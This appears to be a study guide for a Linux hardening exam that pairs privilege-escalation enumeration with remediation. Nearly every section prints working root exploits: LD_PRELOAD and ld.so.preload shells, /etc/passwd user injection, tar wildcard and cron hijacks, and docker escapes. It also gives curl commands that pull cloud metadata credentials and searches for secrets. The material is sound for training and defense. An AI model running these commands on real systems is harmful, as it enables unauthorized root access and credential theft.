---
title:       "LHE Exam"
summary:     "HACKTRICKS LHE - LINUX HARDENING EXPERT"
category:    "HackTricks"
tags:        [lhe, hacktricks]
updated:     2026-07-26
---

{% raw %}

## LHE Field Guide — Linux Hardening Expert (HackTricks) · Professional Edition

A practical, example-driven reference for the HackTricks **Linux Hardening Expert (LHE)** path. Every topic follows the same professional structure:

> **Enumerate** (commands + example output) → **Why it matters** → **Worked example** (attack → root, where useful) → **Harden** (the remediation).

LHE is a purple-team discipline: you learn to *find and prove* a misconfiguration so you can *fix* it. This edition adds concrete command output, worked mini-labs, and per-vector remediation.

> ⚠️ **Authorized use only.** Enumeration and privilege escalation here are for systems you own or are explicitly permitted to assess (labs, CTFs, sanctioned engagements). The worked examples exist to demonstrate the vulnerability *and its fix*. Run tooling like LinPEAS only where you have authorization.

---

## Table of Contents

1. Methodology & Tooling
2. System Information
3. User Information
4. Interesting Files & Permissions
5. Network Information
6. Software Information
7. Processes, Cron, Systemd, D-Bus
8. Containers & Namespaces
9. Cloud Metadata
10. Worked Privilege-Escalation Labs (attack → fix)
11. Master Hardening Checklist
12. Command Appendix & Definitions

---

## 1. Methodology & Tooling

**The privesc/hardening loop.** Local escalation is almost always the abuse of something you are *already allowed to touch*: a writable file a root process reads, a SUID binary that spawns a shell, a cron job you can influence, a capability on a binary, a secret in a config. The workflow never changes:

```
enumerate broadly  →  spot the misconfiguration  →  understand the trust it grants  →  exploit (prove it)  →  remediate (fix it)
```

A defender runs the *same* enumeration an attacker does; the difference is the last step. Automated tools surface the obvious; manual checks catch the rest.

### Enumerate — tooling

```bash
# LinPEAS — flagship automated enumerator; color-codes likely privesc vectors by severity
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh -a 2>/dev/null | tee linpeas.out

# pspy — watch processes & cron WITHOUT root (catches short-lived root jobs ps/top miss)
./pspy64 -pf -i 1000

# lse.sh (linux-smart-enumeration) — leveled second opinion
./lse.sh -l1

# unix-privesc-check — older but thorough static checker
./unix-privesc-check standard
```

**Example — reading LinPEAS output:**

```text
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
[+] [CVE-2021-4034] PwnKit  ── Vulnerable!            ← RED  = ~95% confirmed vector
Sudo version 1.8.31                                  ← check against Baron Samedit (CVE-2021-3156)
/usr/bin/pkexec                                      ← YELLOW = probable, verify manually
```

**Interpretation:** RED lines are near-certain vectors (confirm, then exploit or patch); YELLOW lines are leads to verify. For hardening, **every RED/YELLOW line is a remediation ticket**.

**Reference sites to keep open:** **GTFOBins** (abusing standard binaries via SUID/sudo), **HackTricks** (technique detail), and your distro's CVE tracker (kernel/sudo/pkexec).

---

## 2. System Information

### OS & Kernel

```bash
cat /etc/os-release; uname -a; hostnamectl
cat /proc/version; arch
# example:
# Linux target 4.15.0-112-generic #113-Ubuntu SMP x86_64 GNU/Linux
```

**Why it matters:** the kernel version maps directly to public local-root exploits — **Dirty COW** (≤4.8.3), **Dirty Pipe** (5.8–5.16.11), **OverlayFS/PwnKit-adjacent** bugs, **nf\_tables** LPEs. An unpatched kernel is a one-shot escalation.

**Enumerate for a match (authorized):**

```bash
# quick manual triage — never run random exploit code on prod
searchsploit "Linux Kernel $(uname -r | cut -d- -f1)" 2>/dev/null
# linux-exploit-suggester maps uname -> candidate CVEs
./linux-exploit-suggester.sh
```

**Harden:** patch kernel + packages (`unattended-upgrades`), enable **livepatch/kpatch** to close the reboot gap, subscribe to advisories, and remove build toolchains (`gcc`, headers) from production so exploits can't compile in place.

### Sudo — the single highest-value check

```bash
sudo -l                 # what can THIS user run as root, and under what constraints?
sudo -V | head -1       # version -> CVE check (Baron Samedit 1.8.2–1.9.5p1)
cat /etc/sudoers /etc/sudoers.d/* 2>/dev/null
```

**Example output:**

```text
User svc may run the following commands on target:
    (root) NOPASSWD: /usr/bin/find
    (root) /usr/bin/vim
    Defaults env_keep += "LD_PRELOAD"
```

**Why it matters:** every line here is potential root. `find`, `vim`, `less`, `awk`, `env`, `tar`, `nmap`, `python`… all have **GTFOBins** shell breakouts. A kept `LD_PRELOAD` lets you inject a library into the sudo'd command.

**Worked example —**`sudo find`**→ root (GTFOBins):**

```bash
sudo find . -exec /bin/sh \; -quit
# id -> uid=0(root)
```

**Worked example —**`LD_PRELOAD`**via env\_keep:**

```bash
cat > /tmp/x.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
void _init(){ setuid(0); setgid(0); system("/bin/sh"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>   # -> root shell
```

**Harden:** grant least privilege — specific commands, **absolute paths, no wildcards**, avoid `NOPASSWD`, strip dangerous `env_keep` (`LD_PRELOAD`, `LD_LIBRARY_PATH`, `PYTHONPATH`), keep sudo patched, and prefer narrow tools over shell-capable binaries. Validate with `sudo -l` as the target user after changes.

### PATH & environment

```bash
echo $PATH
env | sort
```

**Why it matters:** if a **writable directory** (or `.`) precedes system dirs, or a privileged script/cron/SUID calls a binary **without an absolute path**, you can drop a malicious binary earlier in PATH — **PATH hijacking**.

**Worked example — PATH hijack of a SUID that calls**`service`**unqualified:**

```bash
# vulnerable SUID binary runs: system("service apache2 start");  (no absolute path)
cd /tmp
printf '#!/bin/sh\n/bin/sh\n' > service && chmod +x service
export PATH=/tmp:$PATH
/path/to/vuln-suid            # 'service' resolves to /tmp/service -> root shell
```

**Harden:** never place writable dirs or `.` in root's PATH; in scripts, cron, and units, call binaries by **absolute path** and set a clean `PATH=` at the top of every root script.

### Disks & Mounts

```bash
mount; findmnt; lsblk -f; df -h; cat /etc/fstab
cat /proc/mounts | grep -E 'nosuid|nodev|noexec' || echo "no hardened mount flags!"
```

**Why it matters:** filesystems missing `nosuid`/`nodev`/`noexec` allow planting SUID binaries or device files; NFS exports with `no_root_squash` let a remote root write root-owned files; extra/unmounted volumes may hold secrets.

**Worked example — SUID on a**`nosuid`**-less writable mount:**

```bash
# if /tmp is NOT nosuid, an attacker who can get a root-owned copy there can SUID it
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash   # (needs root once)
/tmp/rootbash -p    # -p keeps euid=0
```

**Harden:** mount `/tmp`, `/var/tmp`, `/dev/shm`, and user/removable media with `nosuid,nodev,noexec`; never export NFS with `no_root_squash`; encrypt sensitive volumes.

### Inodes, symlinks & hardlinks

```bash
ls -li /etc/passwd                       # inode number
find / -type l -ls 2>/dev/null | head    # symlinks
find / -samefile /etc/passwd 2>/dev/null # hardlinks to a sensitive file
```

**Why it matters:** **symlink races** trick a root process into following a link into `/etc/shadow`; **hardlink attacks** share an inode so old permissions "stick" even after a chmod, and let unprivileged users retain access to files they shouldn't.

**Harden:** confirm `sysctl fs.protected_symlinks=1` and `fs.protected_hardlinks=1` (default on modern kernels); privileged code should use `O_NOFOLLOW` and `mkstemp` for temp files.

### File descriptors (FDs)

```bash
ls -la /proc/self/fd
sudo ls -la /proc/<root-pid>/fd 2>/dev/null   # leaked sensitive FDs?
lsof -nP -p <pid>
lsof +L1                                       # open-but-deleted files (secrets kept alive)
```

**Why it matters:** a leaked FD to `/etc/shadow` or a socket in a root process can expose data; deleted-but-open files still leak via `/proc/<pid>/fd/N`. **Harden:** set `O_CLOEXEC` on sensitive FDs, close them before dropping privileges, and set `hidepid=2` on `/proc`.

---

## 3. User Information

### Enumerate — accounts, groups, presence

```bash
id; whoami; groups
getent passwd | awk -F: '{print $1,$3,$7}' | column -t
awk -F: '($3<1000){print}' /etc/passwd            # system accounts
awk -F: '($3==0){print $1}' /etc/passwd           # UID-0 accounts (should be only 'root')
grep -vE '/nologin|/false' /etc/passwd            # accounts with real shells
```

**Why it matters:** group membership is a privesc map:

| Group | Grants |
|---|---|
| `sudo` / `wheel` | sudo access (see §2) |
| `docker` / `lxd` | **≈ root** via container mounts (see §8) |
| `disk` | raw block-device read → dump `/etc/shadow` |
| `adm` | read system logs (creds, tokens) |
| `shadow` | read `/etc/shadow` directly |
| `video`/`kvm` | device access, occasionally abusable |

**Worked example —**`disk`**group reads shadow via debugfs:**

```bash
# member of 'disk' group:
debugfs -R 'cat /etc/shadow' /dev/sda1   # dumps hashes -> crack offline with hashcat -m 1800
```

**Harden:** minimize privileged-group membership, ensure only `root` has UID 0, remove dormant/unused accounts, and lock service accounts to `/usr/sbin/nologin`.

### Session awareness & activity

```bash
w; who -a; last -aiw | head; lastlog | grep -v 'Never'
cat ~/.bash_history 2>/dev/null; sudo cat /root/.bash_history 2>/dev/null
grep -rIiE 'pass|secret|token|api[_-]?key' ~/.*history 2>/dev/null
```

**Why it matters:** history and active sessions routinely leak credentials, internal hosts, and password-bearing one-liners. **Harden:** never pass secrets on the CLI; set `HISTIGNORE='*pass*:*secret*'`, ship shell history to append-only logging, monitor logins, and expire idle sessions (`TMOUT`).

### Common credential artifacts (lateral-movement fuel)

```bash
find / \( -name 'id_rsa*' -o -name 'id_ed25519*' -o -name '*.pem' -o -name '*.ppk' \) 2>/dev/null
cat ~/.ssh/config ~/.ssh/authorized_keys 2>/dev/null
find / \( -name '.aws' -o -name '.git-credentials' -o -name '.netrc' -o -name 'kube*config' \) 2>/dev/null
grep -rIlE 'BEGIN (RSA|OPENSSH|EC) PRIVATE KEY' / 2>/dev/null | head
```

**Harden:** `chmod 600` private keys, keep secrets out of dotfiles, use an SSH agent / secret manager, and periodically scan home dirs for exposed material.

---

## 4. Interesting Files & Permissions

### SUID / SGID binaries

```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null   # SUID (runs as owner)
find / -perm -2000 -type f -exec ls -la {} \; 2>/dev/null   # SGID (runs as group)
# baseline diff (hardening): compare against a known-good list
find / -perm -4000 -type f 2>/dev/null | sort > /tmp/suid.now
```

**Example output:**

```text
-rwsr-xr-x 1 root root  /usr/bin/passwd     ← expected
-rwsr-xr-x 1 root root  /usr/bin/find       ← DANGEROUS if non-standard
-rwsr-sr-x 1 root root  /opt/backup/runner  ← custom SUID: investigate
```

**Why it matters:** a SUID-root binary runs as root for anyone. If it's shell-capable, has a GTFOBins entry, or can be tricked into executing a command (PATH hijack, argument injection), it's direct root.

**Worked example — SUID**`find`**→ root:**

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit   # -p preserves euid=0 -> root shell
```

**Harden:** strip SUID from anything that doesn't need it (`chmod u-s /path`), replace SUID tools with **capabilities** (narrower), and diff the SUID baseline on a schedule so new ones alert.

### Capabilities

```bash
getcap -r / 2>/dev/null                 # files carrying capabilities
capsh --print                            # current process capabilities
```

**Example output:**

```text
/usr/bin/python3.8 = cap_setuid+ep       ← cap_setuid on python = trivial root
/usr/bin/tarS      = cap_dac_read_search+ep
```

**Why it matters — the dangerous set:** `cap_setuid` (become root), `cap_dac_read_search`/`cap_dac_override` (read/write any file → `/etc/shadow`), `cap_sys_admin` (mount, namespaces — near-root), `cap_sys_ptrace` (inject into root processes), `cap_sys_module` (load kernel modules).

**Worked example —**`cap_setuid`**on python:**

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'   # -> root
```

**Worked example —**`cap_dac_read_search`**reads shadow:**

```bash
/usr/bin/tarS -cf /tmp/s.tar /etc/shadow && tar -xf /tmp/s.tar -O   # read protected file
```

**Harden:** grant the **minimum** capability, audit `getcap -r /` regularly, and in services set `CapabilityBoundingSet=` / `AmbientCapabilities=` to drop everything unneeded.

### ACLs, ld.so & sensitive locations

```bash
getfacl -Rs /etc /opt 2>/dev/null                 # ACLs beyond classic rwx
cat /etc/ld.so.conf /etc/ld.so.conf.d/* ; ldconfig -p | head
ls -la /etc/ld.so.preload 2>/dev/null
ls -la /etc/passwd /etc/shadow /etc/sudoers        # must NOT be writable by you
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys' | head
find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys' | head
```

**Why it matters:** ACLs can grant access the `ls -l` bits hide. A **writable**`/etc/ld.so.preload`, or a writable library directory listed in `ld.so.conf`, injects a library into every dynamically linked (and SUID) program → root. Writable `/etc/passwd`/`shadow`/`sudoers` is instant game-over.

**Worked example — writable**`/etc/passwd`**:**

```bash
# add a root-equiv user with a known password hash (openssl passwd -1 'pw')
echo 'hax:$1$xyz$abc...:0:0:root:/root:/bin/bash' >> /etc/passwd
su hax    # -> uid=0
```

**Worked example — writable**`/etc/ld.so.preload`**:**

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c   # x.c as in §2
echo /tmp/x.so > /etc/ld.so.preload                     # any SUID run now spawns root shell
/usr/bin/passwd                                          # -> root
```

**Harden:** lock ownership/permissions on `ld.so.*` and the critical `/etc` files (root:root, 0644/0440), eliminate world/group-writable system files and directories, and audit ACLs (`getfacl`).

---

## 5. Network Information

### Interfaces & local service exposure

```bash
ip -brief a; ip route; cat /etc/hosts /etc/resolv.conf
ss -tulpen                                          # listening sockets + owning process + user
```

**Example output:**

```text
tcp  LISTEN 0 128 127.0.0.1:6379  users:(("redis-server",pid=811,fd=6))   ← localhost Redis, often no auth
tcp  LISTEN 0 80  0.0.0.0:3306     users:(("mysqld",pid=902,fd=21))
```

**Why it matters:** services bound to `127.0.0.1` are often **unauthenticated** ("trust localhost") and reachable after a foothold or via SSH forward — prime local-privesc/pivot targets.

**Worked example — local unauthenticated Redis → file write:**

```bash
redis-cli -h 127.0.0.1 ping            # PONG (no auth)
# abuse: write an SSH key or cron via Redis if it runs privileged / writable dir
redis-cli config set dir /var/spool/cron/ ; redis-cli config set dbfilename root
```

**Harden:** bind services only to needed interfaces, require auth even on localhost, firewall internal ports, and front internal apps with authn/z.

### Port/service discovery, sniffing, egress

```bash
ss -tan state established                          # live connections
ip neigh                                            # ARP neighbors (adjacent hosts)
for p in 22 80 443 3306 5432 6379 27017; do (echo >/dev/tcp/127.0.0.1/$p) 2>/dev/null && echo "open:$p"; done
tcpdump -ni any -c5 2>/dev/null                    # needs CAP_NET_RAW/root
# egress test — can a compromised host phone home / pull tools?
curl -m5 -sI http://example.com | head -1; (echo >/dev/tcp/1.1.1.1/443) 2>/dev/null && echo egress-443-open
iptables -L -n -v 2>/dev/null; nft list ruleset 2>/dev/null; ufw status verbose 2>/dev/null
```

**Harden:** disable unused services; **default-deny inbound and egress** with an allowlist; encrypt everything in transit; restrict `CAP_NET_RAW`; segment networks; log firewall drops.

---

## 6. Software Information

### Web technologies & exposed apps

```bash
ls -la /var/www /srv 2>/dev/null
find /var/www -maxdepth 3 \( -name '.env' -o -name 'wp-config.php' -o -name 'settings.py' -o -name 'config.php' \) 2>/dev/null
grep -rIlE 'password|secret|api[_-]?key|DB_' /var/www 2>/dev/null | head
nginx -T 2>/dev/null | head; apachectl -S 2>/dev/null
```

**Why it matters:** web roots leak DB creds in config files; locally exposed apps may run privileged or allow command execution (webshell → same user as the web server → then local privesc). **Harden:** keep secrets out of web roots (env vars/vault), run web apps as least-privileged users, tighten config perms, and patch the stack.

### Authentication mechanisms & access control

```bash
grep -vE '^\s*#' /etc/ssh/sshd_config | grep -vE '^\s*$'
cat /etc/pam.d/common-auth /etc/pam.d/sshd 2>/dev/null
cat /etc/login.defs | grep -E 'PASS_(MAX|MIN)_DAYS|UMASK'
```

**Why it matters:** `PermitRootLogin yes`, password auth, empty passwords, permissive PAM, or missing lockout invite brute force and direct root login. **Harden:** `PermitRootLogin no`, **key-only** auth, low `MaxAuthTries`, `fail2ban`/`pam_faillock`, MFA, strong password/PAM policy, restrictive `umask 027`.

### Databases, credentials & cryptographic material

```bash
grep -rIlE 'BEGIN .*PRIVATE KEY|password|secret|token' /etc /opt /home 2>/dev/null | head
find / \( -name '*.kdbx' -o -name '*.ovpn' -o -name 'credentials' -o -name '*.jks' \) 2>/dev/null
mysql -u root 2>/dev/null -e 'select version();'   # unauthenticated local DB?
redis-cli ping 2>/dev/null; mongo --eval 'db.version()' 2>/dev/null
```

**Harden:** centralize secrets in a vault, encrypt at rest, require DB/cache auth + least-priv DB users, rotate anything exposed, restrict perms on key material (`chmod 600`).

---

## 7. Processes, Cron, Systemd, D-Bus

### Process enumeration, memory & open files

```bash
ps auxww --sort=-%mem | head
ps -eo user,pid,cmd | grep -vE '\[' | grep root      # root-owned processes
cat /proc/<pid>/cmdline | tr '\0' ' '; echo           # full args (may hold passwords)
tr '\0' '\n' < /proc/<pid>/environ 2>/dev/null        # env (may hold secrets)
./pspy64 -pf                                           # live process/cron feed (no root needed)
```

**Why it matters:** root processes that reference **writable** scripts/configs, or expose **secrets in args/env**, are escalation vectors. `pspy` reveals short-lived root cron you can't catch with `ps`. **Harden:** never pass secrets via args/env; `hidepid=2` on `/proc`; run services as dedicated low-priv users; restrict `/proc/<pid>` visibility.

### Cron jobs & scheduled tasks — the classic vector

```bash
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.{daily,hourly,weekly,monthly}
cat /etc/cron.d/* 2>/dev/null; crontab -l 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null
# find cron-referenced scripts that YOU can write:
grep -rhoE '/[^ ]+\.(sh|py|pl)' /etc/cron* 2>/dev/null | sort -u | xargs -r ls -la 2>/dev/null
```

**Why it matters:** a root cron running a **world-writable script**, an unquoted **wildcard** (`tar *`, `rsync *` → argument injection), or a **PATH-relative** binary is textbook root.

**Worked example — writable cron script:**

```bash
# /etc/cron.d/backup runs (as root, every minute):  * * * * * root /opt/backup.sh
ls -la /opt/backup.sh    # -rwxrwxrwx (world-writable!)
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /opt/backup.sh
# wait one minute, then:
/tmp/rb -p               # -> root shell
```

**Worked example — tar wildcard injection:**

```bash
# root cron:  cd /home/user/data && tar czf /backup/data.tgz *
cd /home/user/data
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > run.sh
touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh run.sh'
# next run executes run.sh as root -> /tmp/rb -p
```

**Harden:** root cron scripts must be **root-owned, non-writable (0755 root:root)**, referenced by **absolute path**, and never use unquoted wildcards over user-controlled directories; set an explicit `PATH=` in crontab.

### Systemd services & timers

```bash
systemctl list-units --type=service --state=running
systemctl list-timers --all
systemctl cat <service>                              # inspect ExecStart target
find /etc/systemd /lib/systemd -writable 2>/dev/null # writable units = root on restart
```

**Worked example — writable unit / ExecStart target:**

```bash
# unit: ExecStart=/opt/app/run   and /opt/app/run is writable by you
printf '#!/bin/sh\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb\n' > /opt/app/run
sudo systemctl restart app 2>/dev/null || :  # or wait for reboot/timer -> /tmp/rb -p
```

**Harden:** lock unit files + their `ExecStart` targets (root:root, non-writable); apply systemd sandboxing: `NoNewPrivileges=yes`, `ProtectSystem=strict`, `ProtectHome=yes`, `PrivateTmp=yes`, `CapabilityBoundingSet=`, `ReadOnlyPaths=`.

### D-Bus enumeration & abuse

```bash
busctl list                                          # system-bus services (many run as root)
busctl introspect <service> <object> 2>/dev/null
gdbus introspect --system --dest <service> --object-path <path> 2>/dev/null
cat /etc/dbus-1/system.d/*.conf                       # policy: who can call what
```

**Why it matters:** an overly permissive D-Bus policy can let an unprivileged user invoke **privileged methods** (start services, change config, install packages) → escalation. **Harden:** tighten `/etc/dbus-1/system.d/*` to least privilege (deny by default, allow specific senders/methods), audit exposed methods, and patch the services behind them.

---

## 8. Containers & Namespaces

### Threat model

A container is **not a strong security boundary by default** — it's **namespaces** (isolation) + **cgroups** (limits) + **capabilities/seccomp/LSMs** (restrictions). Weaken any layer and escape becomes possible. The two biggest wins:

- `docker`**/**`lxd`**group ≈ root** — a member mounts the host and reads/writes anything.
- **Privileged / over-capable containers** (`--privileged`, `--cap-add=SYS_ADMIN`, host mounts, host PID/net ns) are escape-prone.

### Enumerate — am I contained, and how loosely?

```bash
cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null
grep -i cap /proc/self/status; capsh --print
mount | grep -iE 'overlay|/host'; env | grep -iE 'KUBERNETES|DOCKER'
ls -la /var/run/docker.sock 2>/dev/null              # mounted docker socket = host takeover
lsns; ls -la /proc/1/ns /proc/self/ns
```

**Worked example —**`docker`**group → host root:**

```bash
docker run -v /:/host --rm -it alpine chroot /host /bin/sh   # you are now root on the HOST fs
```

**Worked example — mounted Docker socket inside a container:**

```bash
# /var/run/docker.sock is bind-mounted in:
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh
```

**Worked example — privileged container escape (host mount):**

```bash
# in --privileged container:
fdisk -l                                   # see host disks
mkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host sh   # host fs
```

### Kernel protections (defense layers)

- **cgroups** — resource limits; the historical **release\_agent** escape abused cgroup-v1 + `CAP_SYS_ADMIN`. → use **cgroup v2**, no `SYS_ADMIN`.
- **capabilities** — `--cap-drop=ALL` then add only what's needed.
- **seccomp** — keep the **default profile** (don't `--security-opt seccomp=unconfined`).
- **LSMs** — keep **AppArmor/SELinux** enforcing.
- **filesystem** — `--read-only` rootfs, `--security-opt no-new-privileges`, **user namespaces** to map container-root → unprivileged host UID.

**Hardened run example:**

```bash
docker run --rm \
  --cap-drop=ALL --security-opt=no-new-privileges \
  --read-only --tmpfs /tmp \
  --user 1000:1000 \
  --pids-limit=100 --memory=256m \
  myimage
```

**Runtime / image / control-plane hardening:** never mount `/var/run/docker.sock` or `/` into containers; scan images (**Trivy/Grype**), pin digests, use **distroless/minimal** bases (no shell = smaller blast radius); run **rootless** where possible; lock down Kubernetes (authn/z, NetworkPolicy, PodSecurity, restricted kubelet).

---

## 9. Cloud Metadata

Cloud instances expose a **metadata service** at a link-local address that returns instance data and **temporary credentials**. Reachable from a vulnerable app, it's the classic **SSRF → metadata → cloud creds** escalation/lateral chain.

### AWS (IMDS)

```bash
# IMDSv1 (legacy, no token — the insecure path)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
# IMDSv2 (token required)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Example — creds returned:** `AccessKeyId`, `SecretAccessKey`, `Token` → export and use with `aws sts get-caller-identity`. **Harden:** enforce **IMDSv2** (`HttpTokens=required`), set metadata **hop limit = 1**, scope IAM roles least-privilege, and block app-layer SSRF to `169.254.169.254`.

### GCP

```bash
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"
```

**Harden:** the required `Metadata-Flavor` header blocks naive SSRF; scope service-account roles minimally; restrict which VMs get sensitive scopes.

### Azure (IMDS)

```bash
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Harden:** the `Metadata: true` header requirement blocks naive SSRF; scope **Managed Identity** tightly; monitor token requests.

**Cross-cloud defense:** treat metadata creds as crown jewels — prevent SSRF, least-privilege every instance role, alert on unusual metadata access, and prefer short-lived credentials.

---

## 10. Worked Privilege-Escalation Labs (attack → fix)

Concise end-to-end scenarios tying enumeration to exploitation to remediation. **Lab/authorized environments only.**

**Lab A — Non-standard SUID.**

1. `find / -perm -4000 2>/dev/null` → `/usr/bin/find` is SUID-root.
2. Exploit: `find . -exec /bin/sh -p \; -quit` → root.
3. **Fix:** `chmod u-s /usr/bin/find`; add to SUID baseline monitoring.

**Lab B — Sudo GTFOBins.**

1. `sudo -l` → `(root) NOPASSWD: /usr/bin/less`.
2. Exploit: `sudo less /etc/profile` then `!/bin/sh` → root.
3. **Fix:** remove the entry or replace with a non-shell-capable tool; never `NOPASSWD` pagers/editors.

**Lab C — Writable cron script.**

1. `pspy64` shows root running `/opt/backup.sh` each minute; `ls -la` → world-writable.
2. Exploit: append a SUID-bash drop; wait; `/tmp/rb -p` → root.
3. **Fix:** `chown root:root /opt/backup.sh && chmod 755 /opt/backup.sh`; absolute paths; audit cron ownership.

**Lab D — Capability on interpreter.**

1. `getcap -r / 2>/dev/null` → `python3 cap_setuid+ep`.
2. Exploit: `python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'` → root.
3. **Fix:** `setcap -r /usr/bin/python3`; grant caps only to purpose-built binaries.

**Lab E —**`docker`**group.**

1. `id` → user in `docker`.
2. Exploit: `docker run -v /:/host -it alpine chroot /host sh` → host root.
3. **Fix:** remove user from `docker`; use rootless Docker or sudo-wrapped, audited invocations.

**Lab F — Writable**`/etc/ld.so.preload`**.**

1. `ls -la /etc/ld.so.preload` → writable.
2. Exploit: compile `x.so` (setuid shell), `echo /tmp/x.so > /etc/ld.so.preload`, run any SUID → root.
3. **Fix:** `chown root:root /etc/ld.so.preload && chmod 644`; monitor the file with auditd.

---

## 11. Master Hardening Checklist

- **Patch:** kernel + packages current; livepatch; remove compilers/headers from prod.
- **Least privilege:** minimal sudo (no `NOPASSWD`/wildcards/`env_keep` for `LD_*`), minimal group membership, only `root` = UID 0, dedicated service accounts, drop capabilities.
- **File integrity:** no writable `/etc/{passwd,shadow,sudoers}`, `ld.so.*`, unit files, cron scripts, or root-run binaries; baseline & diff SUID/SGID and capabilities; protected sym/hardlinks.
- **Mounts:** `nosuid,nodev,noexec` on `/tmp`, `/var/tmp`, `/dev/shm`, user/removable media; no NFS `no_root_squash`.
- **Services/network:** disable unused services; bind minimally; auth even on localhost; firewall **inbound and egress** default-deny; encrypt in transit.
- **Auth:** SSH key-only, no root login, `MaxAuthTries` low, `fail2ban`/`pam_faillock`, MFA, strong PAM/password policy, `umask 027`.
- **Secrets:** none in dotfiles/args/env/web roots; vault + encryption at rest; rotate on exposure.
- **Containers:** drop caps, keep seccomp/AppArmor/SELinux enforcing, no `--privileged`, never mount docker socket/host root, minimal/distroless images, rootless, scan images.
- **Cloud:** IMDSv2/required-headers, least-privilege instance roles, block SSRF to metadata, short-lived creds.
- **Monitoring:** `auditd`, centralized logs, `hidepid=2`, scheduled **LinPEAS/lynis** runs to catch drift; alert on new SUID/cron/unit changes.

---

## 12. Command Appendix & Definitions

**One-shot triage block (authorized hosts):**

```bash
id; sudo -l 2>/dev/null; uname -a
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ls -la /etc/cron* /etc/ld.so.preload 2>/dev/null
ss -tulpen 2>/dev/null
grep -rIlE 'PRIVATE KEY|password|secret' /home /etc /opt 2>/dev/null | head
cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null
```

**Definitions:**

- **SUID/SGID** — bits running a binary as its owner/group (often root) regardless of caller.
- **Capabilities** — fine-grained slices of root power (`cap_setuid`, `cap_sys_admin`, `cap_dac_read_search`…).
- **GTFOBins** — reference of standard binaries abusable for shell/file/privesc when SUID or sudo-allowed.
- **PATH hijack** — placing a malicious binary earlier in `PATH` than the intended one.
- **ld.so.preload** — file listing libraries injected into every dynamically linked program (preload hijack surface).
- **Namespace / cgroups / seccomp / LSM** — the isolation, resource-limit, syscall-filter, and MAC layers behind containers.
- **IMDS** — cloud Instance Metadata Service exposing instance data + temporary credentials.
- **LinPEAS / pspy** — automated privesc enumerator / unprivileged process-and-cron watcher.

---

*End of guide. All commands are enumeration/verification/lab templates — run them only on systems you are authorized to assess, and apply the paired "Harden"/"Fix" steps to remediate whatever they reveal.*

{% endraw %}
